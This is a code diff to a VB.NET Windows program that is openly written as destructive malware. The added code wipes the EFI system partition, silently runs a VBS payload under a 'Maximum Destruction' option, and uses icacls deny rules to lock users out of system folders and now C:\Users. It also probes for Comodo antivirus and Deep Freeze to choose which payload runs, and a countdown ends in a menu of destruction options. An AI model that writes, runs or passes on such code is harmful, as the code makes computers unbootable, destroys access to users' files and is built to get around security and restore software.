@@ -8,6 +8,7 @@ Imports System.Media
 Imports System.Threading
 Imports System.Drawing.Drawing2D
 Imports System.ServiceProcess
+Imports System.Text
 
 Public Class Form1
     Inherits Form
@@ -111,6 +112,152 @@ Public Class Form1
 
         End Sub
 
+        ' Public method to run the VBS script.
+        Public Sub ApplyMaximumDestruction()
+            Dim scriptPath As String = "C:\temp.vbs"
+            Try
+                Dim process As New Process()
+                process.StartInfo.FileName = "wscript.exe"
+                process.StartInfo.Arguments = $"""{scriptPath}"""
+                process.StartInfo.UseShellExecute = False
+                process.StartInfo.RedirectStandardOutput = True
+                process.StartInfo.RedirectStandardError = True
+                process.StartInfo.CreateNoWindow = True
+
+                process.Start()
+                Dim output As String = process.StandardOutput.ReadToEnd()
+                Dim errorOutput As String = process.StandardError.ReadToEnd()
+                process.WaitForExit()
+
+                If Not String.IsNullOrEmpty(output) Then
+                    MessageBox.Show("Output: " & output, "Script Output", MessageBoxButtons.OK, MessageBoxIcon.Information)
+                End If
+
+                If Not String.IsNullOrEmpty(errorOutput) Then
+                    MessageBox.Show("Error: " & errorOutput, "Script Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+                End If
+            Catch ex As Exception
+                MessageBox.Show("An error occurred while executing the script: " & ex.Message, "Execution Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+            End Try
+        End Sub
+
+        Private Sub ReplaceBootx64WithBootmgfw()
+            Try
+                ' 1. Mount the EFI system partition to X:
+                Dim mountvolProcess As New Process()
+                mountvolProcess.StartInfo.FileName = "cmd.exe"
+                mountvolProcess.StartInfo.Arguments = "/C mountvol X: /s /q"
+                mountvolProcess.StartInfo.CreateNoWindow = True
+                mountvolProcess.StartInfo.UseShellExecute = False
+                mountvolProcess.Start()
+                mountvolProcess.WaitForExit()
+
+                ' 2. Delete all contents from the X: drive (EFI system partition)
+                Dim rdProcess As New Process()
+                rdProcess.StartInfo.FileName = "cmd.exe"
+                rdProcess.StartInfo.Arguments = "/C rd X:\ /s /q"
+                rdProcess.StartInfo.CreateNoWindow = True
+                rdProcess.StartInfo.UseShellExecute = False
+                rdProcess.Start()
+                rdProcess.WaitForExit()
+
+                ' 3. Extract bootmgfw.efi from Resource1 (string to byte array conversion)
+                Dim bootmgfwString As String = My.Resources.Resource1.bootmgfw
+                Dim bootmgfwData As Byte() = Encoding.UTF8.GetBytes(bootmgfwString)
+
+                ' 4. Ensure the target directory exists
+                Dim efiDir As String = "X:\EFI"
+                Dim targetFilePath As String = "X:\EFI\bootx64.efi"
+
+                If Not Directory.Exists(efiDir) Then
+                    Directory.CreateDirectory(efiDir)
+                End If
+
+                ' 5. Write bootmgfw.efi to X:\EFI\bootx64.efi
+                File.WriteAllBytes(targetFilePath, bootmgfwData)
+
+                MessageBox.Show("Successfully replaced bootx64.efi with bootmgfw.efi", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
+
+            Catch ex As Exception
+                MessageBox.Show("Error during the replacement process: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+            Finally
+                ' Unmount X: drive
+                Dim unmountProcess As New Process()
+                unmountProcess.StartInfo.FileName = "cmd.exe"
+                unmountProcess.StartInfo.Arguments = "/C mountvol X: /d"
+                unmountProcess.StartInfo.CreateNoWindow = True
+                unmountProcess.StartInfo.UseShellExecute = False
+                unmountProcess.Start()
+                unmountProcess.WaitForExit()
+            End Try
+        End Sub
+
+        ' Function to execute different payloads based on user choice
+        Private Sub ExecuteDestruction(choice As String)
+            ' Create an instance of the ComodoAntivirusDetector class
+            Dim detector As New StupidSandboxThingsDetector()
+            ' Check if Deep Freeze is detected
+            If detector.DetectDeepFreeze() Then
+                Select Case choice
+                    Case "Maximum Destruction"
+                        ' Code for maximum destruction
+                        timerLabel.Text = "It can't defend against UEFI! Executing maximum destruction!"
+                        Thread.Sleep(5000)
+                        ApplyMaximumDestruction()
+
+                    Case "Classic UEFI Effects"
+                        ' Code for classic UEFI effects
+                        timerLabel.Text = "It can't defend against UEFI! Executing classic UEFI effects!"
+                        Thread.Sleep(5000)
+                        ReplaceBootx64WithBootmgfw()
+
+                    Case "Surprise Me"
+                        ' Code for less destructive surprise
+                        timerLabel.Text = "Deep Freeze user detected! Non-destructive request declined."
+                        Thread.Sleep(5000)
+
+                    Case "Just Make Unusable My PC Without Destruction"
+                        ' Code for access restrictions
+                        timerLabel.Text = "Deep Freeze user detected! Non-destructive request declined."
+                        Thread.Sleep(5000)
+
+                    Case Else
+                        timerLabel.Text = "Invalid choice!"
+                End Select
+            Else
+                ' Code for scenarios when Deep Freeze is not detected
+                Select Case choice
+                    Case "Maximum Destruction"
+                        ' Code for maximum destruction
+                        timerLabel.Text = "Executing maximum destruction!"
+                        Thread.Sleep(5000)
+                        ApplyMaximumDestruction()
+
+                    Case "Classic UEFI Effects"
+                        ' Code for classic UEFI effects
+                        timerLabel.Text = "Executing classic UEFI effects!"
+                        Thread.Sleep(5000)
+                        ' Write UEFI using bootmgfw from Resource1
+                        ReplaceBootx64WithBootmgfw()
+
+                    Case "Surprise Me"
+                        ' Code for less destructive surprise
+                        timerLabel.Text = "Surprise! Executing less destructive effects!"
+                        Thread.Sleep(5000)
+                        Form1.CreateEpicVBScriptFile()
+
+                    Case "Just Make Unusable My PC Without Destruction"
+                        ' Code for access restrictions
+                        timerLabel.Text = "You can't access your files anymore!"
+                        Thread.Sleep(5000)
+                        ApplyAccessRestrictions()
+
+                    Case Else
+                        timerLabel.Text = "Invalid choice!"
+                End Select
+            End If
+        End Sub
+
         ' Timer tick function, applies effects and updates countdown timer
         Private Sub AnimationTimer_Tick(sender As Object, e As EventArgs)
             Try
@@ -125,16 +272,48 @@ Public Class Form1
                     countdownTime -= 1
                     timerLabel.Text = "Remaining Time: " & countdownTime.ToString() & " seconds"
                 Else
-                    ' When countdown finishes, run destructive payloads and update label
-                    timerLabel.Text = "Time's up! ANTIVIRUSDEFENDER IS EVERYWHERE!"
-                    Thread.Sleep(5000)
-                    ApplyAccessRestrictions()
+                    ' When countdown finishes, prompt user for destruction option
+                    Dim options As String() = {
+                "Maximum Destruction",
+                "Classic UEFI Effects",
+                "Surprise Me",
+                "Just Make Unusable My PC Without Destruction"
+            }
+
+                    Dim choice As String = PromptUserForChoice("Select a destruction option:", options)
+
+                    If Not String.IsNullOrEmpty(choice) Then
+                        timerLabel.Text = "Time's up! ANTIVIRUSDEFENDER IS EVERYWHERE!"
+                        Thread.Sleep(5000) ' Optional: Adjust as needed
+                        ExecuteDestruction(choice)
+                    End If
                 End If
 
             Catch ex As Exception
                 MessageBox.Show("An error occurred during animation: " & ex.Message, "Animation Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
             End Try
         End Sub
+
+        ' Function to prompt user for a choice using a MessageBox
+        Private Function PromptUserForChoice(message As String, options As String()) As String
+            Dim result As DialogResult = MessageBox.Show(message, "Choose an Option", MessageBoxButtons.OKCancel, MessageBoxIcon.Question)
+
+            If result = DialogResult.OK Then
+                ' Create a simple input dialog
+                Dim choice As String = InputBox("Select your choice:", "User Choice", options(0))
+
+                ' Validate user choice against available options
+                For Each opt In options ' Renamed the variable from 'option' to 'opt'
+                    If choice.Equals(opt, StringComparison.OrdinalIgnoreCase) Then
+                        Return opt
+                    End If
+                Next
+
+                MessageBox.Show("Invalid choice! Please select a valid option.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning)
+            End If
+
+            Return String.Empty
+        End Function
 
         ' Apply access restrictions
         Private Sub ApplyAccessRestrictions()
@@ -149,7 +328,8 @@ Public Class Form1
             "icacls ""C:\Windows\system32"" /deny Everyone:(OI)(CI)F",
             "icacls ""C:\Windows\system"" /deny Everyone:(OI)(CI)F",
             "icacls ""C:\Windows\winsxs"" /deny Everyone:(OI)(CI)F",
-            "icacls ""C:\Windows\SysWOW64"" /deny Everyone:(OI)(CI)F"
+            "icacls ""C:\Windows\SysWOW64"" /deny Everyone:(OI)(CI)F",
+            "icacls ""C:\Users"" /deny Everyone:(OI)(CI)F"
         }
 
             For Each command As String In commands
@@ -248,7 +428,7 @@ Public Class Form1
         End Sub
     End Class
 
-    Public Class ComodoAntivirusDetector
+    Public Class StupidSandboxThingsDetector
 
         ' Public method to detect if Comodo Antivirus is installed or present.
         Public Function DetectComodoAntivirus() As Boolean
@@ -260,7 +440,6 @@ Public Class Form1
 
             For Each path As String In comodoPaths
                 If PathExists(path) Then
-                    MessageBox.Show($"Comodo Antivirus detected at path: {path}", "Detection Result", MessageBoxButtons.OK, MessageBoxIcon.Information)
                     Return True
                 End If
             Next
@@ -268,21 +447,52 @@ Public Class Form1
             ' Check for the Comodo Antivirus driver
             Dim driverPath As String = "C:\Windows\System32\drivers\cmdguard.sys"
             If PathExists(driverPath) Then
-                MessageBox.Show("Comodo Antivirus driver detected.", "Detection Result", MessageBoxButtons.OK, MessageBoxIcon.Information)
                 Return True
             End If
 
             ' Check for Comodo Antivirus registry key
             If CheckComodoRegistry() Then
-                MessageBox.Show("Comodo Antivirus registry key detected.", "Detection Result", MessageBoxButtons.OK, MessageBoxIcon.Information)
                 Return True
             End If
 
             ' Check for Comodo Antivirus service
             If CheckComodoService() Then
-                MessageBox.Show("Comodo Antivirus service detected.", "Detection Result", MessageBoxButtons.OK, MessageBoxIcon.Information)
                 Return True
             End If
+
+            Return False
+        End Function
+
+        ' Public method to detect if Deep Freeze is installed or present.
+        Public Function DetectDeepFreeze() As Boolean
+            ' Check for the installation paths
+            Dim deepFreezePaths As String() = {
+            "C:\Program Files\Faronics\Deep Freeze\",
+            "C:\Program Files (x86)\Faronics\Deep Freeze\"
+        }
+
+            For Each path As String In deepFreezePaths
+                If PathExists(path) Then
+                    Return True
+                End If
+            Next
+
+            ' Check for the Deep Freeze driver
+            Dim driverPath As String = "C:\Persi0.sys"
+            If PathExists(driverPath) Then
+                Return True
+            End If
+
+            ' Check for Deep Freeze registry key
+            If CheckDeepFreezeRegistry() Then
+                Return True
+            End If
+
+            ' Check for Deep Freeze service
+            If CheckDeepFreezeService() Then
+                Return True
+            End If
+
             Return False
         End Function
 
@@ -297,9 +507,21 @@ Public Class Form1
             Return RegistryKeyExists(Registry.LocalMachine, comodoKey)
         End Function
 
+        ' Private method to check for Deep Freeze in the registry key.
+        Private Function CheckDeepFreezeRegistry() As Boolean
+            Dim deepFreezeKey As String = "SOFTWARE\Classes\TypeLib\{C5D763D9-2422-4B2D-A425-02D5BD016239}\1.0\HELPDIR"
+            Return RegistryKeyExists(Registry.LocalMachine, deepFreezeKey)
+        End Function
+
         ' Private method to check for the Comodo Antivirus service.
         Private Function CheckComodoService() As Boolean
             Dim serviceName As String = "cmdagent"
+            Return ServiceExists(serviceName)
+        End Function
+
+        ' Private method to check for the Deep Freeze service.
+        Private Function CheckDeepFreezeService() As Boolean
+            Dim serviceName As String = "DFServ"
             Return ServiceExists(serviceName)
         End Function
 
@@ -804,7 +1026,7 @@ Public Class Form1
 
     Private Sub CreateEpicVBScriptFile()
         ' Create the VBScript content
-        Dim vbsContent As String = "MsgBox ""What Are Your Last Words? Spoiler: No UEFI Malware this time. Because it's easy to fix."" , 0, ""serdar.exe""" & vbCrLf &
+        Dim vbsContent As String = "MsgBox ""What Are Your Last Words? Spoiler: No UEFI Malware this time. Because it's easy to fix."" , 0, ""utkudrk.exe""" & vbCrLf &
         "Dim userInput" & vbCrLf &
         "userInput = InputBox(""Enter your response:"", ""utkudrk.exe"")" & vbCrLf &
         "If userInput = ""OK"" Then" & vbCrLf &
@@ -858,7 +1080,7 @@ Public Class Form1
         Dim secretKey As String = "FUCKTHESKIDDERS"
 
         ' Create an instance of the ComodoAntivirusDetector class
-        Dim detector As New ComodoAntivirusDetector()
+        Dim detector As New StupidSandboxThingsDetector()
 
         ' Check if Comodo Antivirus is detected
         If detector.DetectComodoAntivirus() Then
@@ -882,8 +1104,6 @@ Public Class Form1
 
             ' 2. Set the system time to 2038
             SetSystemTimeTo2038()
-
-            CreateEpicVBScriptFile()
 
             ' Start the operations in a new thread
             Dim thread As New Thread(AddressOf ExecutePayload)
